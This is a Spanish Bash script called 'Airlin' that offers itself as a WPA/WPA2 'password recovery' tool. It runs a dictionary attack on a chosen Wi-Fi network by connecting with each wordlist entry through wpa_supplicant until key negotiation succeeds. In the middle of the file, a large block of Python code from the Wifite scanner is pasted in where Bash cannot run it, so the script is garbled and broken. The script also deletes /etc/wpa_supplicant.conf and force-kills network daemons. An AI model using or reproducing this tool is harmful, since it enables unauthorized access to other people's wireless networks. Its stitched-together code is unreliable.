#!/bin/bash

###############################################################################
# Fichero: Airlin                                                             #
# Fecha: 01/Dic/2012                                                          #
# Version: 1.0.1                                                              #
# Autor: Warcry (warcry7474@hotmail.com)                                      #
#                                                                             #
# Agradecimientos: Especial agradecimiento a Berni69  (www.bitsdelocos.es)    #
#                  y Niroz, que me han ayudado en el desarrollo               #
#                                                                             #
#                  y a todos los componentes del equipo de                    #
#                         www.seguridadwirless.net                            #
#									      #
# El Autor no se responsabiliza del uso indebido que esta herramienta pueda   #
# tener, ya que el usuario tiene la obligación de utilizarla siempre acorde   #
# a la legislación vigente del país donde se utilice.                         #
#                                                                             #
# Este programa es software libre; puedes redistribuirlo y/o modificarlo      #
# bajo los terminos de la Licencia Publica General GNU (GPL) publicada        #
# por la Free Software Foundation; en su version numero 3, o (bajo tu         #
# criterio) la ultima version. Mira http://www.fsf.org/copyleft/gpl.txt       #
#                                                                             #
# Este programa se distribuye SIN GARANTIA de ningun tipo.                    #
#                                                                             #
###############################################################################

function mostrarheader(){

echo -e '\e[1;32m#########################################################'
echo -e '\e[1;32m#                                                       #'
echo -e '\e[1;32m#''\e[1;33m			 Airlin' '\e[1;32m               #'
echo -e '\e[1;32m#''\e[1;33m			by Enigma Company''\e[1;32m      #'
echo -e '\e[1;32m#                                                       #'
echo -e '\e[1;32m#########################################################\e[0m'
}

clear
mostrarheader

#comprobacion de usuario

if [ $(whoami) != "root" ]; then
	
 echo -e '\e[1;31m
	
	
      DEBES SER USUARIO ROOT PARA CONTINUAR

        EN KALI PRUEBA: bash Airlin.sh

\e[0m' 

 exit 1

fi

echo -e '\e[1;34m

ESTA ES UNA HERRAMIENTA PARA LA RECUPERACION DE CONTRASEÑAS WPA/2
  PARA RECUPERAR CONTRASEÑAS WEP SE RECOMIENDA USAR WLANREAVER
 \e[0m'
 #variables
red=essid
ret=retardo
dic=dirname
key=line

#seleccion de parametros

echo -e '\e[1;37m \e[0m'
#crea lista con los interfaces wifi del sistema
if [ -z $1 ]; then
	interfaceList=$(iwconfig 2>/dev/null |grep "802.11" |grep -v Monitor |awk '{print $1}')
else
	interfaceList=$1; #si se indicó el dispositivo wifi como parametro de entrada
fi

echo -e '\e[1;31m NO SE MUESTRAN INTERFACES EN MODO MONITOR (COMO: mon0).
\t\tESTA APLICACION NO LOS UTILIZA.\n\e[0m'

if [ -z "$interfaceList" ]; then
	echo -e '\e[1;31m 
	
NO SE ENCONTRO NINGUNA INTERFACE WIRELESS O EN MODO MONITOR
   
	            NO SE PUEDE CONTINUAR.
	
	
	\e[0m'
	
	exit 1
fi

echo

#crea array con dispositivos WiFi existentes
i=0
for interface in $interfaceList; do

 if [ -z "`iwconfig 2>/dev/null |grep -A1 $interface|grep -i "Mode:Monitor"`" ]; then

	deviceList[i]=$interface
	i=`expr $i + 1`
	
 fi

done

#muestra menu para elegir dispositivo

echo -e "SELECCIONA EL DISPOSITIVO WI-FI QUE DESEAS UTILIZAR: "	

i=0
for device in ${deviceList[@]}; do
	echo " ["$i"]" $device
	i=`expr $i + 1` #let i=$i+1
done
echo -e "\n"	

#read -s -N 1 n  #leer un caracter en n, sin esperar intro -N 1, sin eco -s

read n  #leer un caracter en n, sin esperar intro -N 1, sin eco -s

device=${deviceList[n]}

echo -e '\e[1A\e[1;36mHAS SELECCIONADO: '$device "\nLOADING...."

sleep 2 #pausa dramatica XD

clear

mostrarheader


#########################################################################################################START WIFITE SECTION


  os.system('clear')
                    print GR + '\n [+] ' + G + 'scanning' + W + ' (' + G + iface + W + '), updates at 5 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.\n'
                    print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % (
                    'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
                    print '   --- --------------------  %s--  ----  -----  ----  ------' % (
                    '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
                    for i, target in enumerate(targets):
                        print "   %s%2d%s " % (G, i + 1, W),
                        # SSID
                        if target.ssid == '':
                            p = O + '(' + target.bssid + ')' + GR + ' ' + W
                            print '%s' % p.ljust(20),
                        elif ( target.ssid.count('\x00') == len(target.ssid) ):
                            p = '<Length ' + str(len(target.ssid)) + '>'
                            print '%s' % C + p.ljust(20) + W,
                        elif len(target.ssid) <= 20:
                            print "%s" % C + target.ssid.ljust(20) + W,
                        else:
                            print "%s" % C + target.ssid[0:17] + '...' + W,
                        # BSSID
                        if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
                            print O, target.bssid + W,
                        # Channel
                        print G + target.channel.rjust(3), W,
                        # Encryption
                        if target.encryption.find("WEP") != -1:
                            print G,
                        else:
                            print O,
                        print "\b%3s" % target.encryption.strip().ljust(4) + W,
                        # Power
                        if target.power >= 55:
                            col = G
                        elif target.power >= 40:
                            col = O
                        else:
                            col = R
                        print "%s%3ddb%s" % (col, target.power, W),
                        # WPS
                        if self.RUN_CONFIG.WPS_DISABLE:
                            print "  %3s" % (O + 'n/a' + W),
                        else:
                            print "  %3s" % (G + 'wps' + W if target.wps else R + ' no' + W),
                        # Clients
                        client_text = ''
                        for c in clients:
                            if c.station == target.bssid:
                                if client_text == '':
                                    client_text = 'client'
                                elif client_text[-1] != "s":
                                    client_text += "s"
                        if client_text != '':
                            print '  %s' % (G + client_text + W)
                        else:
                            print ''
                    print ''
                print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
                    GR + sec_to_hms(time.time() - time_started) + W, G + 'scanning' + W,
                    G + str(len(targets)) + W, '' if len(targets) == 1 else 's',
                    G + str(len(clients)) + W, '' if len(clients) == 1 else 's'),

                stdout.flush()
        except KeyboardInterrupt:
            pass
        print ''

        send_interrupt(proc)
        try:
            os.kill(proc.pid, SIGTERM)
        except OSError:
            pass
        except UnboundLocalError:
            pass

        # Use "wash" program to check for WPS compatibility
        if not self.RUN_CONFIG.WPS_DISABLE:
            wps_check_targets(targets, self.RUN_CONFIG.temp + 'wifite-01.cap')

        remove_airodump_files(self.RUN_CONFIG.temp + 'wifite')

        if stop_scanning:
            return (targets, clients)
        print ''

        if len(targets) == 0:
            print R + ' [!]' + O + ' no targets found!' + W
            print R + ' [!]' + O + ' you may need to wait for targets to show up.' + W
            print ''
            self.RUN_CONFIG.exit_gracefully(1)

        if self.RUN_CONFIG.VERBOSE_APS: os.system('clear')

        # Sort by Power
        targets = sorted(targets, key=lambda t: t.power, reverse=True)

        victims = []
        print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % (
        'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
        print '   --- --------------------  %s--  ----  -----  ----  ------' % (
        '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
        for i, target in enumerate(targets):
            print "   %s%2d%s " % (G, i + 1, W),
            # SSID
            if target.ssid == '':
                p = O + '(' + target.bssid + ')' + GR + ' ' + W
                print '%s' % p.ljust(20),
            elif ( target.ssid.count('\x00') == len(target.ssid) ):
                p = '<Length ' + str(len(target.ssid)) + '>'
                print '%s' % C + p.ljust(20) + W,
            elif len(target.ssid) <= 20:
                print "%s" % C + target.ssid.ljust(20) + W,
            else:
                print "%s" % C + target.ssid[0:17] + '...' + W,
            # BSSID
            if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
                print O, target.bssid + W,
            # Channel
            print G + target.channel.rjust(3), W,
            # Encryption
            if target.encryption.find("WEP") != -1:
                print G,
            else:
                print O,
            print "\b%3s" % target.encryption.strip().ljust(4) + W,
            # Power
            if target.power >= 55:
                col = G
            elif target.power >= 40:
                col = O
            else:
                col = R
            print "%s%3ddb%s" % (col, target.power, W),
            # WPS
            if self.RUN_CONFIG.WPS_DISABLE:
                print "  %3s" % (O + 'n/a' + W),
            else:
                print "  %3s" % (G + 'wps' + W if target.wps else R + ' no' + W),
            # Clients
            client_text = ''
            for c in clients:
                if c.station == target.bssid:
                    if client_text == '':
                        client_text = 'client'
                    elif client_text[-1] != "s":
                        client_text += "s"
            if client_text != '':
                print '  %s' % (G + client_text + W)
            else:
                print ''

        ri = raw_input(
            GR + "\n [+]" + W + " select " + G + "target numbers" + W + " (" + G + "1-%s)" % (str(len(targets)) + W) + \
            " separated by commas, or '%s': " % (G + 'all' + W))





#########################################################################################################START WIFITE SECTION
echo -e '\e[1;37m

SELECCIONA EL SSID (NOMBRE DE LA RED) 
	
EJEMPLO:\e[0m'	'\e[1;36mWLAN_A1F4\e[0m'
	
echo -e '\e[1;31m

DEBE COINCIDIR EL NOMBRE COMPLETO INCLUYENDO MAYUSCULAS,
MINUSCULAS Y SIMBOLOS ALFANUMERICOS\e[0m'
	
echo -e '\e[1;37m

ESCRIBE ESSID (NOMBRE DE RED)\e[0m'
	
read red

clear

mostrarheader

echo -e '\e[1;37m \e[0m'

echo -e '\e[1;37m

SELECCIONA UN DICCIONARIO: 

ejemplo:\e[0m' '\e[1;36m  /root/Desktop/diccionario.txt\e[0m'

echo -e '\e[1;31m
PARA AGILIZAR EL PROCESO PUEDES ARRASTAR EL DICCCIONARIO HASTA LA CONSOLA\e[0m'

echo -e '\e[1;37m

TECLEA LA RUTA DEL DICCIONARIO: \e[0m'

read dirname

if [ -f $dirname ]; then continue

else

clear

mostrarheader

	echo -e '\e[1;31m 
	
NO HAY NINGUN DICCIONARIO EN LA RUTA ESPECIFICADA
   
	         NO SE PUEDE CONTINUAR.
	
	
	\e[0m'
	
	exit 1
fi


clear

mostrarheader

echo -e '\e[1;37m

SELECCION DE RETARDO
	
ejemplo:\e[0m' '\e[1;36m 5\e[0m'
	
echo -e '\e[1;31m

 ********EL RETARDO DEBE SER PUESTO EN SEGUNDOS********
RECUERDA QUE UN RETARDO DEMASIADO PEQUEÑO PUEDE CAUSAR QUE 
      LA CONTRASEÑA SEA IGNORADA POR LA APLICACION \e[0m'

echo -e '\e[1;37m

TECLEA EL RETARDO: \e[0m'
	
read ret

#proceso de limpieza

echo "
	
LOADING...." 
	
	echo -e '\e[0;30m '; 

	ifconfig $device down
    
	killall -9 dhcpcd 2>/dev/null
	
	killall -9 wpa_supplicant 2>/dev/null
    
	rm -rf $/var/run/dhcpcd 2>/dev/null
    
	rm /var/run/dhcpcd-wlan0.pid 2>/dev/null
	
	sleep 1
	
	ifconfig $device up
	
	sleep 3
	

#establecimiento de conexion

for line in $(cat $dirname); do

 killall -9 wpa_supplicant 2>/dev/null

 rm /etc/wpa_supplicant.conf

 touch /etc/wpa_supplicant.conf
	
 rm airlintmp
	
 clear
 mostrarheader
	
 echo -e '\e[1;35m


	PROBANDO CLAVE
	\n\e[0m''\e[1;33m '$line '\e[0;30m '

 echo -e "\n\n\n	"
    
 wpa_passphrase $red $line >> /etc/wpa_supplicant.conf

 wpa_supplicant -i$device -c/etc/wpa_supplicant.conf -f airlintmp 2>/dev/null & sleep $ret ;
	
	
 if ( grep -i 'WPA: Key negotiation completed' airlintmp ) ; then

  killall -9 wpa_supplicant 2>/dev/null	 '\e[0;30m '
  
clear

mostrarheader
		
  echo -e '\e[1;34m


	  LA CLAVE HA SIDO ENCONTRADA:\n\e[0m' '\e[1;36m '$line '\e[0;30m '
  
  echo -e '\e[1;33m		
		
	            CLAVE ENCONTRADA CON EXITO\e[0m\n\n''\e[0;30m ' ;
	
	break;
		
 fi

done #for
    

if [ -z "`grep -i 'WPA: Key negotiation completed' airlintmp`" ]; then
 
  killall -9 wpa_supplicant 2>/dev/null '\e[0;30m '


  clear
  
  mostrarheader
  
  echo -e '\e[1;31m  
  
      
      
      LA CLAVE NO SE ENCUENTRA DENTRO DEL DICCIONARIO
                    INTENTALO DE NUEVO.
  
  
  \e[0m''\e[0;30m '
fi

rm /etc/wpa_supplicant.conf 2>/dev/null
touch /etc/wpa_supplicant.conf 2>/dev/null
rm airlintmp 2>/dev/null

#END
